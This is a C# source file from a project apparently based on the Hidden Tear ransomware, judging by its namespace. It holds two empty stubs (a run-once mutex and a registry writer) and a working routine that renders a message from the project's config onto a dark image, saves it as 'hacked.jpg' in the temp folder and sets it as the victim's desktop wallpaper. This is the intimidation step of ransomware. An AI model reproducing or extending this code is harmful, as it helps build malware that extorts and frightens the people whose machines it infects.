using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace hidden_tear.Tools
{
    internal class Windows
    {
        public static void RunningOnce()
        {
            using (Mutex mut = new Mutex(false))
            {

            }
        }


        public static void Registry(string path, string var, string val)
        {

        }

        private static void setWallpaper()
        {
            Rectangle screenBounds = Screen.PrimaryScreen.Bounds;
            int screenWidth = screenBounds.Width;
            int screenHeight = screenBounds.Height;
            Bitmap bitmap = new Bitmap(screenWidth, screenHeight);
            using (Graphics graphics = Graphics.FromImage(bitmap))
            {
                graphics.Clear(ColorTranslator.FromHtml("#1a1a1a"));
                Font font = new Font("Arial", 36, FontStyle.Bold);
                SolidBrush brush = new SolidBrush(ColorTranslator.FromHtml("#ffffff"));
                StringFormat format = new StringFormat();
                format.Alignment = StringAlignment.Center;
                format.LineAlignment = StringAlignment.Center;

                int lineHeight = (int)(font.GetHeight() + 5);

                int y = (screenHeight / 2) - ((Config.WALLPAPER.Length / 2) * lineHeight);
                foreach (string line in Config.WALLPAPER)
                {
                    graphics.DrawString(line, font, brush, new RectangleF(0, y, screenWidth, lineHeight), format);
                    y += lineHeight;
                }
            }
            string pathName = Path.GetTempPath() +  "hacked.jpg";
            bitmap.Save(pathName, System.Drawing.Imaging.ImageFormat.Jpeg);
            api.SystemParametersInfo(0x14, 0, pathName, 0x01 | 0x02);
        }
    }
}
